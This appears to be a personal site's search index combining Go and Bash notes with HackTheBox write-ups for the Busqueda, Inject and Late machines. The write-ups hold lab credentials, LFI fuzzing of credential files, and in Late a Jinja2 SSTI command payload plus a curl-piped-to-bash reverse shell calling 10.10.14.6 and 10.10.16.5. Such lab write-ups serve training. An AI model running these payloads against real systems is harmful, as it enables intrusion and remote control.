[{"categories":null,"contents":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/introduction/","summary":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","tags":null,"title":"Introduction"},{"categories":null,"contents":" Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.Println(\u0026#34;Value is\u0026#34;, b) func getPointer () (myPointer *int) { a := 234 return \u0026amp;a a := new(int) *a = 234 Pointers point to a memory location of a variable. Go is fully garbage-collected.\nType Conversion i := 2 f := float64(i) u := uint(i) Slice slice := []int{2, 3, 4} slice := []byte(\u0026#34;Hello\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/types/","summary":"Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.","tags":null,"title":"Basic Types"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.Printf(\u0026#34;At position %d, the character %s is present\\n\u0026#34;, i, val) n := 0 x := 42 for n != x { n := guess() } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/flow-control/","summary":"Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.","tags":null,"title":"Flow Control"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/advanced/files/","summary":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","tags":null,"title":"File Manipulation"},{"categories":null,"contents":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/bash/basic/","summary":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","tags":null,"title":"Bash Variables"},{"categories":null,"contents":"Busqueda Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p- 10.10.11.208 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 05:39 EDT Nmap scan report for 10.10.11.208 (10.10.11.208) Host is up (0.13s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 645.26 seconds â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p22,80 -sC -sV 10.10.11.208 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 05:50 EDT Nmap scan report for 10.10.11.208 (10.10.11.208) Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://searcher.htb/ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds Web Server gobuster â””â”€$ gobuster dir -u http://searcher.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://searcher.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/20 07:56:32 Starting gobuster in directory enumeration mode =============================================================== /search (Status: 405) [Size: 153] /server-status (Status: 403) [Size: 277] Progress: 20721 / 26585 (77.94%)[ERROR] 2023/05/20 08:01:21 [!] parse \u0026#34;http://searcher.htb/error\\x1f_log\u0026#34;: net/url: invalid control character in URL Progress: 26584 / 26585 (100.00%) =============================================================== 2023/05/20 08:02:43 Finished =============================================================== Foothold/User We know that it\u0026rsquo;s a flask app that uses searchor 2.4.0 library Post descrinbing possible vulnerabilities Pull Request for rce fix Let\u0026rsquo;s test it Since we saw eval function is used without any sanitazation, we can craft own payload PoC if needed And it looks like it works Let\u0026rsquo;s get a reverse shell And we have our foothold Root We see some creds in /var/www/app directory cody:jh1usoih2bkjaspwe92 Moreover we also have additional vhost gitea.searcher.htb If we try cody\u0026rsquo;s password for svc it works, now we can check sudo rights We can execute /opt/scripts/system-checkup.py * as root But permissions to that script indicate that I can\u0026rsquo;t read it Let\u0026rsquo;s also open gitea and check it\u0026rsquo;s content Nothing Let\u0026rsquo;s try executing /opt/scripts/system-checkup.py We see a help menu We can list and inspect docker containers running Let\u0026rsquo;s inspect containers And we see creds `` root:jI86kGUuj87guWr3RyF gitea:yuiu1hoiu4i5ho1uh We can try using creds for gitea admin:yuiu1hoiu4i5ho1uh works Now we can access scripts repo Analyze the scripts We have an interesting option in system-checkup.py, where it uses full-checkup.sh script The content of full-checkup.sh But the file full-checkup.sh doesn\u0026rsquo;t exist So we can create our own script anywhere (since the system-checkup.py doesn\u0026rsquo;t use full path) I created reverse shell script and ran sudo python3 /opt/scripts/system-checkup.py full-checkup And we\u0026rsquo;re root ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/busqueda/images/busqueda.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/busqueda/","summary":"Busqueda Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p- 10.10.11.208 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 05:39 EDT Nmap scan report for 10.10.11.208 (10.10.11.208) Host is up (0.13s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 645.26 seconds â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p22,80 -sC -sV 10.10.11.208 -T4 Starting Nmap 7.","tags":["HTB","flask","searchor","python-eval","command-injection","password-reuse","gitea"],"title":"[HTB] Machine: Busqueda"},{"categories":null,"contents":"Inject Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/tasks] â””â”€$ nmap -Pn -p- -T4 10.10.11.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 14:17 EDT Nmap scan report for 10.10.11.204 (10.10.11.204) Host is up (0.16s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5427/tcp filtered sco-peer-tta 8080/tcp open http-proxy 62318/tcp filtered unknown â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/tasks] â””â”€$ nmap -sC -sV -p22,5427,8080,62318 10.10.11.204 -Pn -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 14:27 EDT Nmap scan report for 10.10.11.204 (10.10.11.204) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA) | 256 d51c81c97b076b1cc1b429254b52219f (ECDSA) |_ 256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519) 5427/tcp closed sco-peer-tta 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home 62318/tcp closed unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds Web Server gobuster â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/tasks] â””â”€$ gobuster dir -u http://10.10.11.204:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.204:8080/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/18 13:19:48 Starting gobuster in directory enumeration mode =============================================================== /register (Status: 200) [Size: 5654] /upload (Status: 200) [Size: 1857] /error (Status: 500) [Size: 106] /blogs (Status: 200) [Size: 5371] /environment (Status: 500) [Size: 712] /[ (Status: 400) [Size: 435] /plain] (Status: 400) [Size: 435] /] (Status: 400) [Size: 435] /quote] (Status: 400) [Size: 435] Progress: 20730 / 26585 (77.98%)[ERROR] 2023/05/18 13:24:19 [!] parse \u0026#34;http://10.10.11.204:8080/error\\x1f_log\u0026#34;: net/url: invalid control character in URL /extension] (Status: 400) [Size: 435] /[0-9] (Status: 400) [Size: 435] Progress: 26584 / 26585 (100.00%) =============================================================== 2023/05/18 13:25:50 Finished Foothold We have an upload and register pages I started playing around with upload page Uploaded media file with web shell in it, didn\u0026rsquo;t work But luckily we have lfi I used ffuf for fuzzing â””â”€$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u \u0026#39;http://10.10.11.204:8080/show_image?img=FUZZ\u0026#39; -fc 500 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.204:8080/show_image?img=FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response status: 500 ________________________________________________ [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 131ms] * FUZZ: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 292ms] * FUZZ: ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 228, Words: 23, Lines: 10, Duration: 227ms] * FUZZ: ../../../../../../../../../../../../etc/hosts [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 111ms] * FUZZ: /../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 135ms] * FUZZ: ../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 135ms] * FUZZ: ../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 113ms] * FUZZ: ../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 150ms] * FUZZ: ../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 162ms] * FUZZ: ../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 193ms] * FUZZ: ../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 344ms] * FUZZ: ../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 352ms] * FUZZ: ../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 415ms] * FUZZ: ../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 416ms] * FUZZ: ../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 416ms] * FUZZ: ../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 416ms] * FUZZ: ../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 415ms] * FUZZ: ../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 440ms] * FUZZ: ../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 435ms] * FUZZ: ../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 474ms] * FUZZ: ../../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 512ms] * FUZZ: ../../../../../../../etc/passwd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 283ms] * FUZZ: ../../../../../../etc/passwd\u0026amp;=%3C%3C%3C%3C [Status: 200, Size: 1345, Words: 1, Lines: 1, Duration: 202ms] * FUZZ: ../../../../../../../../../../../../etc/shadow [Status: 200, Size: 1345, Words: 1, Lines: 1, Duration: 292ms] * FUZZ: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow [Status: 200, Size: 1345, Words: 1, Lines: 1, Duration: 221ms] * FUZZ: /../../../../../../../../../../etc/shadow [Status: 200, Size: 4020, Words: 1, Lines: 1, Duration: 301ms] * FUZZ: ../../../../../../../dev [Status: 200, Size: 1345, Words: 1, Lines: 1, Duration: 294ms] * FUZZ: ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow Let\u0026rsquo;s check If we check the /var/www/WebApp, we see that it\u0026rsquo;s a Java project We can download pom.xml It\u0026rsquo;s a configuration file that manages dependencies \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.5\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;!-- lookup parent from repository --\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;groupId\u0026gt;com.example\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;WebApp\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.0.1-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;name\u0026gt;WebApp\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;Demo project for Spring Boot\u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;java.version\u0026gt;11\u0026lt;/java.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.sun.activation\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.activation\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-thymeleaf\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-devtools\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-function-web\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;bootstrap\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.webjars\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;webjars-locator-core\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${parent.version}\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;finalName\u0026gt;spring-webapp\u0026lt;/finalName\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; Now we have pom.xml we can start googling the possible vulnerabilities https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/ From pom.xml we see that spring-cloud-function-web\u0026rsquo;s version is 3.2.2 Potential cve-2022-22963 It looks like we need to add header spring.cloud.function.routing-expression https://www.fastly.com/blog/spring-has-sprung-breaking-down-cve-2022-22963-and-spring4shell-cve-2022 PoC Let\u0026rsquo;s test it I\u0026rsquo;ll create a file using cve-2022-22963 and then check it with lfi And it works Let\u0026rsquo;s get reverse shell I\u0026rsquo;ll download reverse shell script and execute it Now we have our foothold User There is a settings.xml file with creds, we can basically su as phil It\u0026rsquo;s located in /home/frank/.m2 phil:DocPhillovestoInject123 Root pspy shows automated tasks running in the background To be specific it\u0026rsquo;s ansible We have a potential privesc path All we need to do is to create a malicious yml in the /opt/automation/tasks and for the job to complete We can write to the /opt/automation/tasks because phil is in staff group and directory belongs to staff group ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/inject/images/inject.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/inject/","summary":"Inject Enumeration nmap â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/tasks] â””â”€$ nmap -Pn -p- -T4 10.10.11.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 14:17 EDT Nmap scan report for 10.10.11.204 (10.10.11.204) Host is up (0.16s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5427/tcp filtered sco-peer-tta 8080/tcp open http-proxy 62318/tcp filtered unknown â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/tasks] â””â”€$ nmap -sC -sV -p22,5427,8080,62318 10.10.11.204 -Pn -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 14:27 EDT Nmap scan report for 10.","tags":["HTB","file-read","directory-traversal","spring-cloud-function-spel-injection","java","java-spring","maven","spring-cloud-function-web","cve-2022-22963","command-injection","ansible","pspy","ansible-playbook"],"title":"[HTB] Machine: Inject"},{"categories":null,"contents":"Late Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.11.156 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 12:33 BST Nmap scan report for 10.10.11.156 (10.10.11.156) Host is up (0.16s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 696.11 seconds â””â”€$ nmap -Pn -sC -sV 10.10.11.156 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-28 12:33 BST Nmap scan report for 10.10.11.156 (10.10.11.156) Host is up (0.20s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA) | 256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA) |_ 256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: Late - Best online image tools |_http-server-header: nginx/1.14.0 (Ubuntu) 2106/tcp filtered ekshell 3851/tcp filtered spectraport 3998/tcp filtered dnx 6006/tcp filtered X11:6 9502/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.09 seconds Wer Server vhosts late.htb, images.late.htb images.late.htb No other vhost was found â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://late.htb/\u0026#39; -H \u0026#39;Host: FUZZ.late.htb\u0026#39; -fs 9461 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://late.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.late.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 9461 ________________________________________________ [Status: 200, Size: 2187, Words: 448, Lines: 64, Duration: 486ms] * FUZZ: images gobuster â””â”€$ gobuster dir -u http://late.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://late.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt [+] Timeout: 10s =============================================================== 2023/08/28 13:52:20 Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 9461] /contact.html (Status: 200) [Size: 6364] /assets (Status: 301) [Size: 194] [--\u0026gt; http://late.htb/assets/] â””â”€$ gobuster dir -u http://images.late.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://images.late.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: html,txt [+] Timeout: 10s =============================================================== 2023/08/28 13:53:47 Starting gobuster in directory enumeration mode =============================================================== /scanner (Status: 500) [Size: 290] Foothold/User If we upload an image we receive a response with html tags The page says that it can convert image into text document, so maybe we have to send a picture with some text And it works It could be Optical Character recognition Like Tesseract OCR After playing around with request, I was stuck for a while until I saw a hint in the forum regarding SSTI So tried {{ 7 * 7 }} in the image And it worked Now let\u0026rsquo;s try running any command Since it\u0026rsquo;s a flask application, it usually uses jinja2 template engine https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python But when I tried the following payload: {{ cycler.__init__.__globals__.os.popen('id').read() }} It resulted in error Finally, I made it work by changing single quotes to double quotes and made the text bold {{ cycler.__init__.__globals__.os.popen(\u0026quot;id\u0026quot;).read() }} Let\u0026rsquo;s try getting reverse shell The less symbols we have, the better So I will curl script and pipe it to bash #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/443 0\u0026gt;\u0026amp;1 I had to play around with font again Comic Sans MS worked in this case {{ cycler.__init__.__globals__.os.popen(\u0026quot;curl 10.10.16.5/shell | bash \u0026quot;).read() }} svc_acc has a key, we can download it and connect via ssh for more 